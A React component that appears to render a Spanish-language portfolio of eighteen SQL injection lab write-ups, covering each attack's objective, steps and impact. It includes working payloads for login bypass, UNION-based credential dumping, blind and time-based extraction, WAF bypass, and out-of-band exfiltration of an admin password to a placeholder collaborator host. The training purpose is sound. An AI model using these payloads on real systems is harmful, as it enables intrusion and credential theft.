import React, { useState } from 'react';
import { FaServer, FaTerminal, FaCode, FaCheckCircle, FaExclamationTriangle, FaBug, FaDatabase, FaShieldAlt } from 'react-icons/fa';
import { motion, AnimatePresence } from 'framer-motion';

const labsData = [
    {
        id: 1,
        title: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
        type: "In-band",
        level: "Apprentice",
        payload: "' OR 1=1--",
        description: "Bypassing a WHERE clause to extract hidden products del backend usando un operador tautológico.",
        objective: "El objetivo de esta práctica es manipular una consulta SQL no sanitizada dentro de un filtro de categorías de una tienda web (`/filter?category=X`), provocando que la aplicación liste absolutamente todos los productos registrados, independientemente de la variable lógica de estado 'released'.",
        steps: [
            {
                title: "Interceptar la petición original",
                text: "Utilizamos Burp Suite para capturar la petición GET al momento de hacer clic en la categoría 'Gifts'. Notamos que la aplicación pasa el parámetro en la URL de la forma:",
                code: "GET /filter?category=Gifts HTTP/1.1"
            },
            {
                title: "Analizar la sintaxis SQL subyacente",
                text: "Inferimos que el backend está tomando el parámetro 'Gifts' y armando internamente una consulta a base de datos de estructura similar a:",
                code: "SELECT * FROM products WHERE category = 'Gifts' AND released = 1"
            },
            {
                title: "Diseñar la inyección",
                text: "Para obligar a la consulta a listar toda la tabla e ignorar la regla de seguridad 'released = 1', inyectamos una comilla simple para cerrar la variable literal, agregamos el operador lógico OR con una condición siempre verdadera (1=1), e insertamos el doble guion (--) para comentar y neutralizar el resto de la instrucción.",
                code: "PAYLOAD: ' OR 1=1--"
            },
            {
                title: "Enviar el Payload envenenado",
                text: "Enviamos la petición modificada hacia el backend. El motor de Base de Datos recibirá ahora una orden completamente distinta por culpa de nuestra inyección:",
                code: "SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1"
            },
            {
                title: "Explotación Exitosa",
                text: "Debido a que '1=1' es siempre verdadero, se anula el filtro selectivo de la categoría. Al mismo tiempo, el comentario '--' elimina de ejecución todo el bloque posterior. El servidor procesa la consulta con 200 OK y refleja todo el catálogo oculto en la respuesta.",
                code: "HTTP/1.1 200 OK\n[...Catálogo Oculto Extraído...]"
            }
        ],
        impact: "Alta confidencialidad vulnerada. Un atacante iterativo podría modificar esta cláusula simple para iniciar técnicas de enumeración de columnas en el futuro, pero de per se, expone catálogo o inventario restringido.",
        images: [
            "parcial2/act08_images/lab1_step1.png",
            "parcial2/act08_images/lab1_step2.png",
            "parcial2/act08_images/lab1_step3.png",
            "parcial2/act08_images/lab1_step4.png"
        ]
    },
    {
        id: 2,
        title: "SQL injection vulnerability allowing login bypass",
        type: "In-band",
        level: "Apprentice",
        payload: "administrator'--",
        description: "Forzar la autenticación y saltarse el mecanismo de comprobación de contraseña.",
        objective: "Traspasar el portal de inicio de sesión comprometiendo el campo de usuario e ingresando a una base de datos vulnerable para loguearse como el administrador principal sin conocer la credencial secretada.",
        analysis: "El portal valida el login haciendo un: `SELECT * FROM users WHERE username='X' AND password='Y'`. Si introducimos en el campo de usuario `administrator'--`, el motor SQL interpreta literalmente el fin de la cadena después del apóstrofe y el doble guón ignora la validación obligatoria del campo de contraseña, ejecutando un logueo válido inmediatamente.",
        impact: "Crítico. Toma total de control de cuenta (Account Takeover) elevando de visitante nulo a los máximos privilegios, comprometiendo todo el sistema de la tríada (CIA)."
    },
    {
        id: 3,
        title: "SQL injection attack, querying the database type and version on Oracle",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT BANNER, NULL FROM v$version--",
        description: "Exfiltración activa de la firma del fabricante y versión exacta en bases de datos Oracle.",
        objective: "Utilizar el operador relacional UNION SELECT para obligar a la aplicación a emitir un volcado con la información de los metadatos y conocer si el servidor es Oracle y qué versión corre.",
        analysis: "Una base de datos de Oracle es rigurosa; requiere obligatoriamente hacer selecciones con la instrucción FROM. Usamos tablas de metadatos integradas conocidas como `v$version`. Una vez determinada la cantidad compatible de columnas con `ORDER BY`, el UNION anexa el registro con el BANNER de la versión directamente al código fuente del frontend.",
        impact: "Reconocimiento avanzado. Identificar el motor de base de datos específico y su versión abre la puerta a la búsqueda de exploits públicos o CVEs (Common Vulnerabilities and Exposures) en etapas avanzadas del ataque."
    },
    {
        id: 4,
        title: "SQL injection attack, querying database type and version on MySQL and Microsoft",
        type: "UNION-based",
        level: "Apprentice",
        payload: "' UNION SELECT @@version, NULL#",
        description: "Recolectar huellas digitales de versión para los servidores MSSQL / MySQL.",
        objective: "Averiguar de la misma manera que el lab anterior si el motor subyacente es un entorno MySQL o Microsoft SQL utilizando consultas que no requieren forzar tablas internas `FROM` como en Oracle.",
        analysis: "Se determina que el número de columnas a empatar es de 2. Debido a la tolerancia sintáctica de MySQL o de Microsoft Server, se recurre a la función interna pasiva `@@version` dentro de nuestra cláusula UNION anidada con los caracteres especiales de comentario correspondientes (`#` o `--`).",
        impact: "Revela la tecnología core de infraestructura. Facilita enormemente pivotar hacia técnicas complejas como la inyección que lee directorios del sistema operativo o ejecución de procedimientos extendidos de Microsoft (xp_cmdshell)."
    },
    {
        id: 5,
        title: "SQL injection attack, listing the database contents on non-Oracle",
        type: "UNION-based",
        level: "Practitioner",
        payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--",
        description: "Navegación completa a través del Information Schema estandarizado en SQL.",
        objective: "Navegar y extraer la lista maestra de todas las tablas integradas y sus columnas de una base de datos no-oracle, permitiendo mapear y encontrar datos como contraseñas.",
        analysis: "A través del estándar ISO `information_schema`. Se inyecta la búsqueda a `tables` con respecto al `table_name`. Al obtener la tabla secreta que almacena a los usuarios, volvemos a inyectar un UNION pero dirigido esta vez hacia el diccionario `information_schema.columns` filtrando con `WHERE table_name = 'users_ab12'`. Así, inferimos cómo se llaman exactamente las columnas donde habitan los secretos.",
        impact: "Fuga masiva de arquitectura de DB. En este punto el atacante ya posee un mapa completo e idéntico del modelo entidad-relación del backend."
    },
    { id: 6, title: "SQL injection attack, listing the database contents on Oracle", type: "UNION-based", level: "Practitioner", payload: "' UNION SELECT table_name, NULL FROM all_tables--", description: "Alternativa exfiltrativa del esquema base utilizando el diccionario predeterminado de Oracle Database.", objective: "Equivalente al laboratorio anterior; la meta es rastrear la totalidad de la estructura funcional para la base de datos exclusiva del ecosistema Oracle usando la tabla all_tables.", analysis: "En Oracle, no existe 'information_schema'. Por ende, el atacante inyecta una concatenación sobre `all_tables` para las tablas, y sobre `all_tab_columns` para la recuperación del nombre de las columnas dentro de la tabla secreta de credenciales dinámicas de Portswigger.", impact: "Severa ruptura de la confidencialidad en infraestructuras de nivel corporativo pesadas como las que usan Oracle DB." },
    { id: 7, title: "SQL injection UNION attack, determining the number of columns", type: "UNION-based", level: "Apprentice", payload: "' ORDER BY 3--", description: "Paso inicial fundamental (footprinting) indispensable de un buen ataque de UNION.", objective: "Descubrir de manera infalible la longitud exacta que tiene el array o la consulta original de la aplicación, pues el operador sintáctico UNION falla instantáneamente y arroja error 500 si no empatamos la misma asimetría de columnas.", analysis: "Se explota iterando el índice del comamdo `ORDER BY` progresivamente (`ORDER BY 1--`, luego 2, 3...) hasta que la base de datos estalla porque le pedimos ordenarlo bajo una columna que no existe en el índice de la tabla real devolviendo un Internal Server Error.", impact: "Alineación de reconocimiento. Sin este paso simple y sistemático, el atacante estaría completamente a ciegas para estructurar un Payload extractivo." },
    { id: 8, title: "SQL injection UNION attack, finding a column containing text", type: "UNION-based", level: "Apprentice", payload: "' UNION SELECT NULL, 'a', NULL--", description: "Identificando la composición atómica (String/Integer) de las columnas.", objective: "Una vez sabiendo el número de columnas devueltas, precisamos inyectar texto. Esto obligadamente nos requiere evaluar en qué columna específica podemos alojar carácteres VARCHAR y comprobar en dónde inyectar el dump final.", analysis: "Si la tabla tenía tres columnas descubiertas. Se introduce un ataque pasante usando celdas NULL, y se iteran secuencialmente cadenas hasta observar cual es validada y aparece pintada en el código fuente HTTP de retorno. `UNION SELECT 'a', NULL, NULL--`...", impact: "Comprobación de vector útil; sin celdas de compatibilidad de texto, se dificultaría sacar hashes de contraseñas de las bases de datos." },
    { id: 9, title: "SQL injection UNION attack, retrieving data from other tables", type: "UNION-based", level: "Apprentice", payload: "' UNION SELECT username, password FROM users--", description: "El final de la fase de explotación UNION: Robo frontal masivo de credenciales en columnas compatibles.", objective: "Una vez que tenemos el número exacto de columnas, su compatibilidad VARCHAR, y los nombres de las tablas y campos confidenciales en nuestra posición, ejecutamos la extracción masiva.", analysis: "Teniendo todo el esquema a mano, usamos los campos vulnerables compatibles para obligar al servidor Web, que pretendía devolver ropa y regalos, a arrojar dentro de la categoría las celdas concatenadas extraoficiales de la base de datos, en este caso las tablas críticas que contienen todos los usuarios y sus passwords del laboratorio.", impact: "Compromiso absoluto (Total Pwnage). Filtración instantánea del archivo plano o tabla de passwords, la vulnerabilidad llegó a su fase más perjudicial." },
    { id: 10, title: "SQL injection UNION attack, retrieving multiple values in a single column", type: "UNION-based", level: "Practitioner", payload: "' UNION SELECT NULL, username || '~' || password FROM users--", description: "Emulando y concatenando outputs en DBs de columnas de string singulares.", objective: "Superar el desafío técnico de extraer username y pass al mismo tiempo cuando el escaneo muestra que solo 1 columna de la aplicación está capacitada para alojar texto y el resto son enteros.", analysis: "Utilizamos funciones intrínsecas de concatenación de SQL (como doble pipe `||` o `CONCAT()`) en nuestro ataque para fusionar las variables de nombre y hash, uniéndolas artificialmente mediante un delimitador `~` para enviar todos los datos juntos sobre la única tubería disponible en la aplicación.", impact: "Permite un Data Dump rápido sin importar lo restrictiva o constreñida que sea la consulta vulnerable descubierta." },
    { id: 11, title: "Blind SQL injection with conditional responses", type: "Blind", level: "Practitioner", payload: "xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--", description: "Ataque lógico a ciegas: formulación de hipótesis lógicas para exfiltración forense remota indirecta.", objective: "Derrotar arquitecturas modernas que ya no reflejan resultados de consulta en crudo (escondidas o ciegas) y que solo validan un contexto booleano (True/False) alterando elementos visibles en la interfaz del DOM (Mensaje de Bienvenida).", analysis: "Se introduce una inyección con una sentencia Substring iteradora con Fuerza Bruta mediante herramientas como Burp Intruder. Formulamos: 'Si la primera letra del admin es A, muestra el saludo; si no, desaparece'. Iteramos letra por letra basándonos puramente en la respuesta del UI.", impact: "Peligrosamente indetectable. Demuestra que no revelar errores sintácticos de SQL es una defensa insuficiente ante un auditor persistente." },
    { id: 12, title: "Blind SQL injection with conditional errors", type: "Blind", level: "Practitioner", payload: "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'", description: "Uso malicioso y predeterminado del enrutamiento de errores aritméticos para inducir Data Leak.", objective: "Obligar a una máquina que no refleja cambios booleanos a emitir errores HTTP de tipo 500 (Server Error) únicamente cuando nuestra suposición sobre el dato que nos roba o queremos es CIERTA.", analysis: "Un ataque lógico condicionado por fallos forzados (usualmente división por 0 - DIV0). Si la letra actual inferida coincide con la contraseña real del administrador, invocamos el error cast/math, esto destruyendo la página web; si no es la contraseña, devolvemos un string vacío inofensivo que devuelve Status HTTP 200.", impact: "Extrae cualquier dato por fuerza bruta apoyándose sobre una validación y manejo de excepciones defectuosa y mal manejada en el servidor (CWE-755)." },
    { id: 13, title: "Visible error-based SQL injection", type: "Error-based", level: "Practitioner", payload: "' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--", description: "Abuso de un mal manejo de errores del middleware donde el stacktrace refleja contenido literal.", objective: "Explotar la verbosidad excesiva del debugger del backend para forzarlo a revelar la contraseña en el propio texto final del Throw Catch de la web.", analysis: "Obligamos al motor SQL a tomar y convertir un texto crudo (la contraseña extraída por Sub-Query) a un dígito numérico `INT`. Esta operación naturalmente va a fallar, provocando que el motor de Base de Datos envíe textualmente el error 'Fallo al convertir la cadena (MIPASSWORD) al tipo int' arrojando nuestro objetivo sin esfuerzo.", impact: "Riesgos por configuraciones por defecto expuestas (Information Leakage). La desactivación de los errores en las variables de producción elimina este vector instantáneamente." },
    { id: 14, title: "Blind SQL injection with time delays", type: "Blind (Time)", level: "Practitioner", payload: "x'%3bSELECT+pg_sleep(10)--", description: "Inducción de pausas cronometradas y métrica de latencias para comprobar existencia en PostgreSQL.", objective: "Comprobar definitivamente la existencia de una inyección en entornos absolutos de tipo BLIND, en la que incluso manipular fallas del código no tiene un impacto visible directo u asíncrono sobre la página del visor.", analysis: "Se concatena o se encuadra un operador matemático transaccional de suspensión `pg_sleep(10)` en PostgreSQL o `WAITFOR DELAY` en otro. Si la respuesta del servidor Web aumenta abruptamente y sistemáticamente a más de diez segundos, la arquitectura es vulnerable.", impact: "Primera barrera para un exfiltrado severo del tipo Time-based." },
    { id: 15, title: "Blind SQL injection with time delays and information retrieval", type: "Blind (Time)", level: "Practitioner", payload: "x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--", description: "Comprobaciones algorítmicas demoradas como túnel lateral cronometrado avanzado de robo.", objective: "Involucra extraer el password y enumerar información crítica letra a letra condicionado exclusivamente al tiempo (cronómetro del analista/Script).", analysis: "Se formula mediante un script en Python. La consulta pregunta cíclicamente letra por letra sobre la contraseña del súper usuario. Si la iteración de fuerza bruta acierta temporalmente, le ordena una orden inatacable de congelarse ` sleep(10) `. El Python cronometra y determina qué letra fue en base al timeout del Socket HTTP devuelto por el servidor host y de esa manera va imprimiendo la clave a ciegas localmente.", impact: "Peligro Inminente. Indetectable ante WAFs tradicionales porque solo parece un tráfico validado. Único defecto: Es altamente lento y depende de una excelente banda ancha de Internet sin mucho ruido estático." },
    { id: 16, title: "Blind SQL injection with out-of-band interaction", type: "OAST", level: "Practitioner", payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--", description: "Bypass agresivo forzando resoluciones asíncronas de OAST y exfiltraciones no convencionales con XML XXE vía SQL.", objective: "Comprobar la inyección asincrónica interactuando con servidores foráneos cuando el servidor vulnerable no tiene manera fisiológica o limitación de WAF firewall para reponer data a nuestro cliente emisor al no tener salida HTTP hacia internet.", analysis: "En vez de pedir que SQL regrese datos, el atacante forza al motor (ej: Oracle DB) a ejecutar comandos misceláneos como pedir un archivo Web o invocar una directamente entidad XML y solicitar DNS Resolvers a su `Burp Collaborator`. El servidor web invisible realiza el Request por sí mismo contra nuestro servidor de monitorización aseverando que la falla es explotable.", impact: "Ataque asíncrono (OAST). Alta efectividad en redes cerradas y aisladas del DMZ." },
    { id: 17, title: "Blind SQL injection with out-of-band data exfiltration", type: "OAST", level: "Practitioner", payload: "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLAB.net/\">+%25remote%3b]>'),'/l')+FROM+dual--", description: "Colusión DNS maliciosa avanzada filtrando data vía resolución TLD de DNS CNAME.", objective: "Ejecutar y extraer el password blindado sin conectividad bidireccional forzando una consulta DNS con los secretos insertados intrínsecamente dentro de la jerarquía o nivel inicial del Dominio malicioso.", analysis: "El atacante concatena la respuesta privada o Query SQL que tiene la password de texto explícito (MIPASS) dentro del TLD que el parser interno va a intentar buscar. SQL procesará la URL HTTP como: `http://MIPASS.BURP-COLLABORATOR.net`. Solo basta con ver los registros estáticos del servidor DNS interceptado para ver nuestra data y contraseñas secretas en texto plano alojada dentro del log de peticiones DNS que hizo el servidor infectado.", impact: "Permite bypass total en WAF y barreras Firewalls; el filtrado a través del protocolo 53 (DNS) raramente está bloqueado para servidores corporativos salientes en data centers cerrados." },
    { id: 18, title: "SQL injection with filter bypass via XML encoding", type: "Filter Bypass", level: "Practitioner", payload: "&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;+", description: "Evasión y ofuscación pura contra WAF empresariales abusando de decodificadores internos de XML o JSON.", objective: "Inyectar dentro de un bloque XML del aplicativo vulnerable para evadir los filtros de caracteres o Expresiones Regulares del Firewall Activo cuando sube el nivel de control sobre la palabra UNION y SELECT explícitas bloqueándolas estáticamente de la petición original y dando baneos 403 Forbidden.", analysis: "Ya que la input original es en XML para SOAP. El Firewall no decodifica sintaxis Hex. El atacante transcodifica el payload de inyección (`UNION SELECT` etc) a un Hex Entity codificado `&#x...;`. El Web Application Firewall de perímetro lee esto como valores aleatorios ciegos y lo deja pasar sin bloquear la petición. El parser en el Servidor lo recibe, lo decodifica a su formato predeterminado legítimo que será SELECT y se inserta limpiamente por diseño sobre la consulta vulnerable final del script, realizando el robo de datos con WAF bypasseado existosamente.", impact: "Comprobación del Bypass severo; Las defensas implementadas puramente como regex simples sin modelado dinámico son ilusorias. Es un caso emblemático para priorizar un parche de Consulta Parametrizada siempre (Prepared Statements)." }
];

const SQLInjectionLabs = () => {
    const [activeLabId, setActiveLabId] = useState(1);
    const activeLab = labsData.find(lab => lab.id === activeLabId);

    return (
        <div className="flex flex-col lg:flex-row gap-6 bg-[#0a0f1a] rounded-xl border border-gray-800 shadow-2xl overflow-hidden min-h-[700px] max-h-[900px] font-sans">

            {/* Sidebar Navigation */}
            <div className="lg:w-1/3 bg-[#05080f] border-r border-gray-800 flex flex-col h-[400px] lg:h-auto">
                <div className="p-4 border-b border-gray-800 bg-black/40">
                    <h3 className="text-green-500 font-mono font-bold tracking-widest text-sm flex items-center gap-2">
                        <FaServer /> PORTAL DE LABORATORIOS
                    </h3>
                    <p className="text-xs text-gray-500 mt-1">Selecciona un modelo de explotación para analizar su arquitectura e impacto correspondiente.</p>
                </div>

                <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-1">
                    {labsData.map((lab) => (
                        <button
                            key={lab.id}
                            onClick={() => setActiveLabId(lab.id)}
                            className={`w-full text-left p-3 rounded-lg transition-all duration-200 border ${activeLabId === lab.id
                                ? 'bg-green-900/20 border-green-500/50 text-white shadow-[0_0_10px_rgba(34,197,94,0.1)]'
                                : 'border-transparent text-gray-400 hover:bg-gray-800/50 hover:text-gray-200'
                                }`}
                        >
                            <div className="flex items-center justify-between mb-1">
                                <span className="font-mono text-xs font-bold w-6 h-6 rounded bg-black/50 border border-gray-700 flex items-center justify-center">
                                    {String(lab.id).padStart(2, '0')}
                                </span>
                                <span className={`text-[9px] px-2 py-0.5 rounded uppercase font-bold tracking-wider ${lab.level === 'Apprentice' ? 'bg-blue-500/20 text-blue-400' : 'bg-orange-500/20 text-orange-400'
                                    }`}>
                                    {lab.level}
                                </span>
                            </div>
                            <p className="text-xs truncate font-medium">{lab.type}</p>
                        </button>
                    ))}
                </div>
            </div>

            {/* Main Content Area */}
            <div className="lg:w-2/3 p-6 lg:p-8 relative flex flex-col overflow-y-auto custom-scrollbar">
                <AnimatePresence mode="wait">
                    <motion.div
                        key={activeLab.id}
                        initial={{ opacity: 0, x: 20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -20 }}
                        transition={{ duration: 0.3 }}
                        className="flex-1 flex flex-col h-full"
                    >
                        {/* Header */}
                        <div className="mb-6 pb-4 border-b border-gray-800">
                            <div className="flex items-center gap-3 mb-4">
                                <span className="bg-green-500/10 text-green-400 border border-green-500/30 px-3 py-1 text-xs font-mono rounded-full uppercase tracking-wider shadow-[0_0_10px_rgba(34,197,94,0.2)]">
                                    {activeLab.type}
                                </span>
                                <span className="bg-gray-800 text-gray-300 px-3 py-1 text-xs font-mono rounded-full">
                                    LAB #{String(activeLab.id).padStart(2, '0')}
                                </span>
                            </div>
                            <h2 className="text-xl lg:text-2xl font-bold text-white leading-tight mb-2">
                                {activeLab.title}
                            </h2>
                            <p className="text-gray-400 text-sm italic font-mono mb-4">
                                - {activeLab.description}
                            </p>
                        </div>

                        {/* Informative Grid */}
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                            <div className="bg-blue-900/10 border border-blue-900/30 p-4 rounded-lg">
                                <h4 className="text-blue-400 text-xs font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                    <FaCheckCircle /> Objetivo del Ataque
                                </h4>
                                <p className="text-xs text-gray-300 leading-relaxed font-mono">
                                    {activeLab.objective}
                                </p>
                            </div>
                            <div className="bg-red-900/10 border border-red-900/30 p-4 rounded-lg">
                                <h4 className="text-red-400 text-xs font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                    <FaExclamationTriangle /> Análisis de Impacto
                                </h4>
                                <p className="text-xs text-gray-300 leading-relaxed font-mono">
                                    {activeLab.impact}
                                </p>
                            </div>
                        </div>

                        {/* Evidence Gallery (if available) */}
                        {activeLab.images && (
                            <div className="mb-6 p-4 border border-violet-500/20 bg-violet-900/10 rounded-lg">
                                <h4 className="text-violet-400 text-xs font-bold font-mono tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-violet-500/30 pb-2">
                                    EJECUCIÓN DEL LABORATORIO & EVIDENCIA VISUAL
                                </h4>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    {activeLab.images.map((imgSrc, idx) => (
                                        <div key={idx} className="relative group overflow-hidden rounded border border-gray-700 hover:border-violet-500 transition-colors">
                                            <div className="absolute top-0 left-0 bg-violet-500/80 text-white text-[9px] font-bold px-2 py-0.5 rounded-br z-10">Paso {idx + 1}</div>
                                            <img src={`${import.meta.env.BASE_URL}${imgSrc}`} alt={`Evidencia Lab ${activeLab.id} Paso ${idx + 1}`} className="w-full h-auto object-cover transform transition-transform duration-500 group-hover:scale-105" />
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}

                        {/* Visual Terminal / Output Mockup */}
                        <div className="flex-none bg-black rounded-lg border border-gray-800 overflow-hidden flex flex-col font-mono text-xs shadow-2xl relative mb-6">
                            {/* Terminal Header */}
                            <div className="bg-gray-900 border-b border-gray-800 px-4 py-2 flex items-center gap-2">
                                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                                <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                <span className="ml-4 text-gray-500">burp-suite-proxy.exe / repeater</span>
                            </div>

                            {/* Terminal Body */}
                            <div className="p-4 text-gray-300 flex-none space-y-4">
                                <div className="border-l-2 border-green-500 pl-4 py-2 bg-green-900/10">
                                    <div className="text-green-500 font-bold mb-2 flex items-center gap-2">
                                        <FaBug /> POISONED PAYLOAD DETECTED
                                    </div>
                                    <div className="bg-black border border-green-900 p-3 rounded text-green-400 break-all shadow-[0_0_15px_rgba(34,197,94,0.15)] overflow-x-auto whitespace-pre-wrap">
                                        <motion.span
                                            initial={{ opacity: 0 }}
                                            animate={{ opacity: 1 }}
                                            transition={{ duration: 0.5 }}
                                        >
                                            <span className="text-red-400 font-bold">INJECT &raquo; </span>
                                            {activeLab.payload}
                                        </motion.span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {/* Explicación Técnica (Análisis Step-By-Step) */}
                        <div className="mt-6 bg-gray-900/40 border-l-4 border-yellow-500 p-5 rounded-r relative overflow-hidden">
                            {/* Decorative background for steps */}
                            <FaCode className="absolute top-4 right-4 text-4xl text-yellow-500/5 opacity-50" />

                            <h4 className="text-yellow-500 text-xs font-bold tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-yellow-500/20 pb-3">
                                <FaCode /> Desarrollo Técnico de la Explotación
                            </h4>

                            {activeLab.steps ? (
                                <div className="space-y-0 mt-4 relative">
                                    {/* Timeline line */}
                                    <div className="absolute left-3.5 top-2 bottom-6 w-px bg-yellow-500/20 -z-0"></div>

                                    {activeLab.steps.map((step, index) => (
                                        <div key={index} className="flex gap-4 relative z-10 pb-6 group">
                                            <div className="flex flex-col items-center">
                                                <div className="flex items-center justify-center w-7 h-7 bg-[#0a0f1a] rounded-full text-yellow-500 text-xs font-bold border border-yellow-500/50 shadow-[0_0_10px_rgba(234,179,8,0.2)] group-hover:scale-110 group-hover:bg-yellow-500/10 transition-all">
                                                    {index + 1}
                                                </div>
                                            </div>
                                            <div className="pt-1 flex-1">
                                                <h5 className="text-yellow-400 text-xs font-bold mb-2 tracking-wide">{step.title}</h5>
                                                <p className="text-gray-300 text-xs leading-relaxed mb-3">
                                                    {step.text}
                                                </p>
                                                {step.code && (
                                                    <div className="bg-black border border-gray-800 p-3 rounded-md text-green-400 font-mono text-[10px] sm:text-xs break-all shadow-inner block w-full relative group-hover:border-gray-600 transition-colors">
                                                        <div className="absolute top-0 left-0 w-1 h-full bg-green-500 rounded-l-md opacity-50"></div>
                                                        $ {step.code}
                                                    </div>
                                                )}
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            ) : (
                                <p className="text-sm text-gray-300 leading-relaxed">
                                    {activeLab.analysis}
                                </p>
                            )}
                        </div>

                    </motion.div>
                </AnimatePresence>
            </div>

        </div>
    );
};

export default SQLInjectionLabs;
